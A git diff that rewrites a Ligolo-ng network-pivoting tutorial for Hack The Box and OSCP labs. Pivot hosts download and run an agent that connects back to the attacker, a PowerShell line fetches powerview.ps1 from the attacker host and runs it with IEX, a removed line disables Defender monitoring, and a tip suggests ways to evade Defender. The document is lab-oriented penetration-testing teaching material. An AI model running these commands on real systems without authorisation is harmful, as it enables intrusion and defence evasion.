@@ -1,293 +1,229 @@
+# 🔀 Ligolo-ng — Pivot the Right Way
 
-##
-#
-https://dalemazza.github.io/blog/Ligolo-ng/
-#
-https://github.com/nicocha30/ligolo-ng
-#
-https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
-#
-##
+> **Scope:** Authorized penetration testing / lab environments only (HTB, OSCP prep, etc.)
 
-dalemazza's blog
-Ligolo-ng - Pivot the right way
-by dalemazzaDecember 20, 2022 4 min read
+---
 
+## What & Why
 
+Ligolo-ng creates a **TUN interface tunnel** from a reverse TCP/TLS connection. Unlike SOCKS proxies, it gives you a real network interface — meaning tools like `nmap`, `impacket`, and raw TCP/UDP work without proxychains.
 
-Recently I completed Dante which is a pro lab on hack the box. During this challenge lab there were several pivot points that gave you access to the internal network. My old method of using chisel here was really annoying me due to its limitations with using SOCKS. After some research I found these tools to be the best of both worlds.
-Ligolo-ng
-This a fantastic tool that creates a proxy tunnel on your TUN interface. Allowing you to pivot whilst maintaining all functionality of TCP/UDP etc. (LOOKING AT YOU SOCKS!). It uses an proxy server hosted on the attacking machine, then an agent placed onto the machine you need access from. Here is the link to its github.
+| Tool | Interface | nmap scripts | UDP | Setup |
+|---|---|---|---|---|
+| Chisel | SOCKS | ❌ | ❌ | Medium |
+| sshuttle | TUN | ✅ | ⚠️ | Easy |
+| **Ligolo-ng** | **TUN** | **✅** | **✅** | **Easy** |
 
-Here are some benefits of the tool
+---
 
-Tun interface (No more SOCKS!)
-Simple UI with agent selection and network information
-Easy to use and setup
-Automatic certificate configuration with Let’s Encrypt
-Performant (Multiplexing)
-Does not require high privileges
-Socket listening/binding on the agent
-Multiple platforms supported for the agent
-sshuttle
-This tool can create a proxy on connection via SSH. You simply specify the subnet you want tunneling to your host. This also avoids the need for SOCKS. Here is the link to its github.
+## 📥 Installation
 
+```bash
+cd /opt && mkdir ligolo && cd ligolo
 
+# Proxy (runs on YOUR machine)
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_Linux_64bit.tar.gz
+tar -xvf ligolo-ng_proxy_Linux_64bit.tar.gz && mv proxy lin-proxy
 
-The Goal
-I want to access the file server located at 172.16.5.25. To achieve this I will have to do several pivots.
+# Agent (pushed to TARGET)
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_Linux_64bit.tar.gz
+tar -xvf ligolo-ng_agent_Linux_64bit.tar.gz && mv agent lin-agent
 
+# Windows agent (for Windows targets)
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_Windows_64bit.zip
+unzip ligolo-ng_agent_Windows_64bit.zip && mv agent.exe win-agent.exe
+```
 
+> **Tip:** Always grab the latest release tag from [github.com/nicocha30/ligolo-ng/releases](https://github.com/nicocha30/ligolo-ng/releases) — the version in the URL above may lag behind.
 
-The set up
-First of all let’s use my attacking machine on 10.10.14.10 and set up a tunnel to the 172.16.1.0/24 subnet.
+---
 
-sshuttle
-Using previously obtained SSH credentials, I can use sshuttle to create a tunnel to this new subnet.
+## ⚙️ Attacker Machine Setup (do this once)
 
-sshuttle -r USER@10.10.14.10 172.16.1.0/24
+```bash
+# Create the TUN interface
+sudo ip tuntap add user $USER mode tun ligolo
 
-Now you will have access to this subnet. Here is what the current set up looks like.
-
-
-
-Using this tunnel I can access the 172.16.1.14 machine. This machine has access to the 172.16.5.0/24 network. Lets use ligolo-ng to set up a tunnel for this.
-
-Ligolo-ng
-To use this program we need to set up a few things on the attackers machine in our instance its the 10.10.14.10 machine, these are as follows
-
-# This will create a new TUN interface
-sudo ip tuntap add user [your_username] mode tun ligolo
-# This will set the link on yhe nee interface to up
+# Bring it up
 sudo ip link set ligolo up
-# This will add a route to the new tunnel.
-# NOTE this is where you insert the new subnet you want to access.
-sudo ip route add 172.16.5.0/24 dev ligolo
-Next we just run the ./proxy script to run the proxy on our attacking machine. Please note for this I am using no encryption.
 
-./proxy -selfcert
+# Verify
+ip addr show ligolo
+```
 
-Now using access on the 172.16.1.14 I will deploy the agent
+Start the proxy — port 443 is recommended as it's rarely blocked by firewalls:
 
-./agent -connect 10.10.14.10:11601 -ignorecert
+```bash
+./lin-proxy -selfcert -laddr 0.0.0.0:443
+```
 
-Now switching back to the proxy server we can see the agent has established connection.
+> **Tip:** `-selfcert` auto-generates a certificate. For ops where cert pinning matters, use `-letsencrypt` with a real domain instead.
 
+---
+
+## 🗺️ Scenario Overview
+
+```text
+ [Attacker]          [Pivot 1]           [Pivot 2]          [Target]
+ 10.10.14.10  ──── 172.16.1.14  ───── 172.16.5.20  ───── 172.16.5.25
+               agent 1 here         agent 2 here        file server
+```
+
+Goal: reach `172.16.5.25` from `10.10.14.10` through two pivot hops.
+
+---
+
+## 🚀 Single Pivot
+
+### Step 1 — Deliver the agent to Pivot 1
+
+Serve it from your machine:
+
+```bash
+sudo python3 -m http.server 80
+```
+
+On the Linux target:
+
+```bash
+wget http://10.10.14.10/lin-agent
+chmod +x lin-agent
+./lin-agent -connect 10.10.14.10:443 -ignore-cert
+```
+
+On a Windows target:
+
+```bash
+certutil.exe -urlcache -split -f "http://10.10.14.10/win-agent.exe" win-agent.exe
+.\win-agent.exe -connect 10.10.14.10:443 -ignore-cert
+```
+
+> **Tip:** If Defender is active, try downloading via `(New-Object Net.WebClient).DownloadFile()` or encode the binary as base64.
+
+### Step 2 — Connect the session
+
+Back in the proxy console you'll see:
+
+```text
 INFO[0102] Agent joined. name=WS-01 remote="172.16.1.14:38000"
-On the proxy we now can select the session we want to interact with and then start the tunnel
+```
 
-ligolo-ng » session 
-? Specify a session : 1 - WS-01 - 172.16.1.14:38000
-# Next simply type start to start using the tunnel
+Select and start:
+
+```text
+ligolo-ng » session
+? Specify a session: 1 - WS-01 - 172.16.1.14:38000
 [Agent : WS-01] » start
-[Agent : WS-01] » INFO[0690] Starting tunnel to WS-01
-Now we have access to the 172.16.5.0/24 subnet and our set up looks like this.
+INFO[0120] Starting tunnel to WS-01
+```
 
+### Step 3 — Add the route
 
+```bash
+sudo ip route add 172.16.5.0/24 dev ligolo
+```
 
-This is all fun and games but it seems the host 172.16.5.25 is only reachable via the 172.16.5.20 machine. In this set up we cannot hit the machine. Double pivot anyone??
+You can now hit anything in `172.16.5.0/24` directly from your attacker box.
 
-Double pivot
+---
 
+## 🔀 Double Pivot
 
-In order for ligolo to know how to access this host we need to place a second agent on the .20 machine, doing this will allow the tunnel to see and know how to route traffic to the .25 machine. After starting the agent on the .20 with the same commands as above you will see the agent establish connection in the proxy server
+Ligolo only tunnels **one active session at a time**, but you can have multiple agents connected and switch between them freely.
 
-Ligolo can only be tunneling from 1 session at a time. So we need to change to the new session and start the tunnel. Like so.
+### Step 1 — Enumerate from Pivot 1
 
-INFO[0102] Agent joined. name=DC-01 remote="172.16.5.20:27600"
-[Agent : WS-01] » session 
-? Specify a session : 2 - DC-01 - 172.16.5.20:27660
+On the compromised Linux machine:
+
+```bash
+ip route
+ifconfig
+netstat -an
+```
+
+On a Windows machine:
+
+```bash
+netstat -an | findstr "ESTABLISHED"
+ipconfig /all
+# or with PowerView:
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/powerview.ps1')
+Get-NetForestTrust
+```
+
+> **Tip:** Look for additional network interfaces or established connections to subnets you haven't seen yet — those are your next pivot targets.
+
+### Step 2 — Deploy agent on Pivot 2
+
+From your already-tunneled access to `172.16.5.20`, deliver and run the agent the same way as Step 1 above.
+
+### Step 3 — Switch the active session
+
+In the proxy console:
+
+```text
+[Agent : WS-01] » session
+? Specify a session: 2 - DC-01 - 172.16.5.20:27660
 [Agent : DC-01] » start
 ? Tunnel already running, switch from WS-01 to DC-01? (y/N) Yes
-INFO[0450] Closing tunnel to WS-01... 
-[Agent : DC-01] » INFO[0450] Starting tunnel to DC-01   
-Now you can SSH to the final host. The final set up will look like this.
+INFO[0450] Closing tunnel to WS-01...
+INFO[0451] Starting tunnel to DC-01
+```
 
+### Step 4 — Add the new route
 
+```bash
+sudo ip route add 172.16.5.25/32 dev ligolo
+# or the whole subnet if needed:
+sudo ip route add 172.16.5.0/24 dev ligolo
+```
 
-It is worth noting that you can have as many agents deployed as you like and can simply switch the session and press start to switch to that tunnel to access the subnet you require.
+You can now reach `172.16.5.25` directly. 🎉
 
-Summary
-Deploying and using pivots like above is an integral part of pen testing. Using the tools above make this as painless as possible while retaining full functionality on things like nmap script scans and more.
+---
 
-A point to note here if you do not have SSH for the initial pivot, simply just use a ligolo agent ;)
+## 🔁 sshuttle (Quick Alternative for First Hop)
 
-Hope you learnt something!
+If you already have SSH credentials to a pivot host and just need fast access to a subnet:
 
+```bash
+sshuttle -r user@172.16.1.14 172.16.1.0/24 --ssh-cmd "ssh -i id_rsa"
+```
 
-##
-##
+> **When to use it:** sshuttle is great for a quick first hop when you have SSH. Use Ligolo-ng once you're deeper in the network where SSH isn't available.
 
+---
 
-How to Tunnel and Pivot Networks using Ligolo-ng
-Software Sinner
-Software Sinner
+## 🧹 Cleanup
 
-·
-Follow
+```bash
+# Remove routes
+sudo ip route del 172.16.5.0/24 dev ligolo
+sudo ip route del 172.16.5.25/32 dev ligolo
 
-6 min read
-·
-Jun 8, 2023
-54
+# Tear down the interface
+sudo ip link set ligolo down
+sudo ip tuntap del mode tun ligolo
 
+# Verify it's gone
+ip addr show ligolo 2>&1 | grep -q ligolo && echo "still up" || echo "cleaned"
+```
 
-3
+---
 
+## 📋 Quick Reference
 
-
-
-
-On my journey to take on the OSCP I learned that pivoting/tunneling can be a confusing concept at first for beginners. After doing extensive research I came across an awesome easy to use tool called Ligolo-ng. Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).
-
-
-To follow this walkthrough or do some practicing I would recommend signing up with Hack The Box Pro labs. The pro labs have a lot of pivoting/tunneling involved that will help boost your comfort with these concepts and get you ready to take on the OSCP or real world pen tests.
-
-Note: If you are a visual learner I would recommend this YouTube video I found very helpful :)
-
-
-Step 1:
-
-To start off you will need to download the agent and proxy files from the ligolo-ng releases page on github. The agent and proxy will depend on what system you are on and the system you are targeting. The agent will be ran on the target machine and the proxy tool will be ran on your machine.
-
-Agent- Target machine
-
-Proxy- Attacker machine (Yours)
-
-Releases · nicocha30/ligolo-ng
-An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. - Releases · nicocha30/ligolo-ng
-github.com
-
-You can download them manually from the web interface or just grab them with the wget command in the current working directory you are in. I like to put all tools in my /opt directory with a designated folder for the tools.
-
-cd /opt
-
-mkdir ligolo
-
-cd ligolo
-Agent File:
-
-sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
-Proxy File:
-
-sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
-Now we need to unpack these files with the following commands and I recommend renaming them to the specific system you are going to use them on.
-
-tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
-
-ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
-
-sudo mv proxy lin-proxy
-
-sudo mv agent lin-agent
-Step 2:
-
-There are some prerequisite commands we need to run before launching ligolo. These commands create a tun interface on the Proxy Server (C2).
-
-sudo ip tuntap add user [your_username] mode tun ligolo
-
-sudo ip link set ligolo up
-On your machine get ligolo running:
-
-./lin-proxy -selfcert -laddr 0.0.0.0:443 
-Note: You can chose any port to listen on. I chose 443 because this port is known by most firewalls and wont get flagged.
-
-
-Ligolo tool running
-In another window once the above commands are all followed we need to push the agent file onto the target machine. You can accomplish this by running a python web server in the directory where the agent file resides.
-
-sudo python -m http.server 80
-Grab the agent file from the attacker machine using wget.
-
-Run these commands on the Target Machine:
-
-wget http://<your attacker machine IP here>/lin-agent
-
-chmod +x lin-agent
-
-./lin-agent -connect <attacker IP here>:443 -ignore-cert
-
-Connection Established
-You should see the connection get grabbed by the ligolo tool if the commands were ran successfully on target machine. You can manage your tunneled sessions in the tool by typing session in the above example screenshot and you can toggle between them once more are established. \
-
-Step 3:
-
-On the target machine if you enumerated you can discover other network interfaces the machine is interacting with or established connections to other internal IP’s. This will help us pivot to other networks and continue our attacks.
-
-Run the following commands to discover other networks the machine is interacting with:
-
-Linux Machine:
-
-netstat -an
-
-ip route
-
-ifconfig
-
-Target machine showing indicators of other networks
-Now that we have the target network we want to pivot to in order to reach the other hosts and attack them lets add them to ligolo routes and start them.
-
-On Attacker machine run:
-
-sudo ip route add 192.168.110.0/24 dev ligolo
-
-My routes for each machine compromised
-Now you should be able to reach those other IP’s and perform attacks ;)
-
-Step 4 (Next Pivot):
-
-Let’s say we get a hold of a domain controller from carrying out our attacks from that subnet we pivoted to, and we notice now that this host is on Windows and is also communicating with another subnet after doing some enumeration. You can use some commands to enumerate and utilize powerview or winPEAS.
-
-PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows “net *” commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.
-
-PowerTools/powerview.ps1 at master · PowerShellEmpire/PowerTools
-This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below…
-github.com
-
-Windows Machine:
-
-netstat -an | findstr "192.168."
-Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
-(New-Object System.Net.WebClient).DownloadString(‘http://<your IP Here>/powerview.ps1') | IEX
-Get-NetForestTrust
-We notice that a new subnet is being interacted with and new domain discovery after doing the above enumeration techniques.
-
-
-Netstat output
-
-Download the windows agent that matches your targets architecture in my case its 64-bit and then push it onto the machine the same way we did above but this time slightly different steps since this is a windows machine..
-
-Release v0.4.3 · nicocha30/ligolo-ng
-An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. - Release v0.4.3 · nicocha30/ligolo-ng
-github.com
-
-On your attacker machine:
-
-sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Windows_64bit.zip
-You might already have your python web server still running from before so make sure you have the same file in the directory you are serving from.
-
-sudo python -m http.server 80
-On the Windows machine:
-
-certutil.exe -urlcache -split -f "http://<Your IP Here>:80/win-agent.exe"
-
-Now lets establish a connection with the agent:
-
-./win-agent.exe -connect <your IP here>:443 -ignore-cert
-You should see two sessions available now when running the session command in ligolo.
-
-
-Now that we know the next IP route lets add it to ligolo and start it.
-
-On your linux machine:
-
-sudo ip route add 192.168.210.0/24 dev ligolo
-You should see the following if command was added correctly..
-
-
-Go back to your ligolo interface running and type session and select the machine with the new tunnel and type start. It will ask you if you want to switch tunnels just select yes..
-
-
-You should now have learned how to pivot to two different networks. This process will be rinsed and repeated when seeing other machines on the network communicating to other subnets. You will push the agent file on the machine that is communicating with another network or domain and have it connect back to the ligolo interface then route that IP subnet with ligolo and type start.
-
-I hope you found this walkthrough helpful please share with others and ensure to follow and comment if you have any questions!
+```text
+ACTION                          COMMAND
+────────────────────────────────────────────────────────────────
+Create TUN interface            sudo ip tuntap add user $USER mode tun ligolo
+Bring interface up              sudo ip link set ligolo up
+Start proxy (attacker)          ./lin-proxy -selfcert -laddr 0.0.0.0:443
+Connect agent (Linux target)    ./lin-agent -connect <IP>:443 -ignore-cert
+Connect agent (Windows target)  .\win-agent.exe -connect <IP>:443 -ignore-cert
+List sessions                   session  (in proxy console)
+Start tunnel                    start    (in proxy console)
+Add route                       sudo ip route add <subnet> dev ligolo
+Remove route                    sudo ip route del <subnet> dev ligolo
+Tear down interface             sudo ip link set ligolo down
+```
